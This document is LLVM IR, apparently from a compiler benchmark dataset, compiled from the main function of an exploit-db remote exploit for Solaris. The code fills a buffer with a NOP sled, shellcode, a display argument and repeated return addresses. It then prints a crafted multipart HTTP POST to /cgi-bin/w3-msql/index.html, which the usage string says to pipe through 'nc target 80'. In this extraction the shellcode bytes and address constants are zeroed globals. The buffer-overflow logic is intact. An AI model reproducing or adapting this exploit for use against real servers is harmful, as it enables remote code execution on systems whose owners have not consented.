; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_19696.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/remote/extr_19696.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@ADDR = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [42 x i8] c"Usage: %s target display | nc target 80 \0A\00", align 1
@BUFSIZE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"malloc()\00", align 1
@shellcode = common dso_local global i8* null, align 8
@NOP = common dso_local global i32 0, align 4
@ADDR_TIMES = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [43 x i8] c"POST /cgi-bin/w3-msql/index.html HTTP/1.0\0A\00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c"Connection: Keep-Alive\0A\00", align 1
@.str.4 = private unnamed_addr constant [58 x i8] c"User-Agent: Mozilla/4.60 [en] (X11; I; Linux 2.0.38 i686\0A\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"Host: %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [61 x i8] c"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg\0A\00", align 1
@.str.7 = private unnamed_addr constant [23 x i8] c"Accept-Encoding: gzip\0A\00", align 1
@.str.8 = private unnamed_addr constant [21 x i8] c"Accept-Language: en\0A\00", align 1
@.str.9 = private unnamed_addr constant [36 x i8] c"Accept-Charset: iso-8859-1,*,utf-8\0A\00", align 1
@.str.10 = private unnamed_addr constant [35 x i8] c"Content-type: multipart/form-data\0A\00", align 1
@.str.11 = private unnamed_addr constant [21 x i8] c"Content-length: %i\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"%s \0A\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = load i64, i64* @ADDR, align 8
  store i64 %10, i64* %8, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 3
  br i1 %12, label %13, label %19

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str, i64 0, i64 0), i8* %16)
  %18 = call i32 @exit(i32 -1) #3
  unreachable

19:                                               ; preds = %2
  %20 = load i32, i32* @BUFSIZE, align 4
  %21 = call i8* @malloc(i32 %20)
  store i8* %21, i8** %6, align 8
  %22 = icmp eq i8* %21, null
  br i1 %22, label %23, label %26

23:                                               ; preds = %19
  %24 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %25 = call i32 @exit(i32 -1) #3
  unreachable

26:                                               ; preds = %19
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 2
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @strlen(i8* %29)
  %31 = trunc i32 %30 to i8
  %32 = sext i8 %31 to i32
  %33 = add nsw i32 %32, 43
  %34 = trunc i32 %33 to i8
  %35 = load i8*, i8** @shellcode, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 44
  store i8 %34, i8* %36, align 1
  %37 = load i8*, i8** %6, align 8
  store i8* %37, i8** %7, align 8
  %38 = load i8*, i8** %7, align 8
  %39 = load i32, i32* @NOP, align 4
  %40 = load i32, i32* @BUFSIZE, align 4
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 2
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @strlen(i8* %43)
  %45 = sub nsw i32 %40, %44
  %46 = load i8*, i8** @shellcode, align 8
  %47 = call i32 @strlen(i8* %46)
  %48 = sub nsw i32 %45, %47
  %49 = load i32, i32* @ADDR_TIMES, align 4
  %50 = mul nsw i32 %49, 4
  %51 = sub nsw i32 %48, %50
  %52 = call i32 @memset(i8* %38, i32 %39, i32 %51)
  %53 = load i32, i32* @BUFSIZE, align 4
  %54 = load i8*, i8** @shellcode, align 8
  %55 = call i32 @strlen(i8* %54)
  %56 = sub nsw i32 %53, %55
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 2
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @strlen(i8* %59)
  %61 = sub nsw i32 %56, %60
  %62 = load i32, i32* @ADDR_TIMES, align 4
  %63 = mul nsw i32 %62, 4
  %64 = sub nsw i32 %61, %63
  %65 = load i8*, i8** %7, align 8
  %66 = sext i32 %64 to i64
  %67 = getelementptr inbounds i8, i8* %65, i64 %66
  store i8* %67, i8** %7, align 8
  %68 = load i8*, i8** %7, align 8
  %69 = load i8*, i8** @shellcode, align 8
  %70 = load i8*, i8** @shellcode, align 8
  %71 = call i32 @strlen(i8* %70)
  %72 = call i32 @memcpy(i8* %68, i8* %69, i32 %71)
  %73 = load i8*, i8** @shellcode, align 8
  %74 = call i32 @strlen(i8* %73)
  %75 = load i8*, i8** %7, align 8
  %76 = sext i32 %74 to i64
  %77 = getelementptr inbounds i8, i8* %75, i64 %76
  store i8* %77, i8** %7, align 8
  %78 = load i8*, i8** %7, align 8
  %79 = load i8**, i8*** %5, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 2
  %81 = load i8*, i8** %80, align 8
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 2
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 @strlen(i8* %84)
  %86 = call i32 @memcpy(i8* %78, i8* %81, i32 %85)
  %87 = load i8**, i8*** %5, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 2
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 @strlen(i8* %89)
  %91 = load i8*, i8** %7, align 8
  %92 = sext i32 %90 to i64
  %93 = getelementptr inbounds i8, i8* %91, i64 %92
  store i8* %93, i8** %7, align 8
  store i32 0, i32* %9, align 4
  br label %94

94:                                               ; preds = %124, %26
  %95 = load i32, i32* %9, align 4
  %96 = load i32, i32* @ADDR_TIMES, align 4
  %97 = icmp slt i32 %95, %96
  br i1 %97, label %98, label %127

98:                                               ; preds = %94
  %99 = load i64, i64* %8, align 8
  %100 = and i64 %99, 255
  %101 = trunc i64 %100 to i8
  %102 = load i8*, i8** %7, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 0
  store i8 %101, i8* %103, align 1
  %104 = load i64, i64* %8, align 8
  %105 = and i64 %104, 65280
  %106 = ashr i64 %105, 8
  %107 = trunc i64 %106 to i8
  %108 = load i8*, i8** %7, align 8
  %109 = getelementptr inbounds i8, i8* %108, i64 1
  store i8 %107, i8* %109, align 1
  %110 = load i64, i64* %8, align 8
  %111 = and i64 %110, 16711680
  %112 = ashr i64 %111, 16
  %113 = trunc i64 %112 to i8
  %114 = load i8*, i8** %7, align 8
  %115 = getelementptr inbounds i8, i8* %114, i64 2
  store i8 %113, i8* %115, align 1
  %116 = load i64, i64* %8, align 8
  %117 = and i64 %116, 4278190080
  %118 = ashr i64 %117, 24
  %119 = trunc i64 %118 to i8
  %120 = load i8*, i8** %7, align 8
  %121 = getelementptr inbounds i8, i8* %120, i64 3
  store i8 %119, i8* %121, align 1
  %122 = load i8*, i8** %7, align 8
  %123 = getelementptr inbounds i8, i8* %122, i64 4
  store i8* %123, i8** %7, align 8
  br label %124

124:                                              ; preds = %98
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %9, align 4
  br label %94

127:                                              ; preds = %94
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0))
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %130 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.4, i64 0, i64 0))
  %131 = load i8**, i8*** %5, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 1
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0), i8* %133)
  %135 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.6, i64 0, i64 0))
  %136 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.7, i64 0, i64 0))
  %137 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0))
  %138 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.9, i64 0, i64 0))
  %139 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.10, i64 0, i64 0))
  %140 = load i32, i32* @BUFSIZE, align 4
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.11, i64 0, i64 0), i32 %140)
  %142 = load i8*, i8** %6, align 8
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i64 0, i64 0), i8* %142)
  %144 = load i8*, i8** %6, align 8
  %145 = call i32 @free(i8* %144)
  %146 = load i32, i32* %3, align 4
  ret i32 %146
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
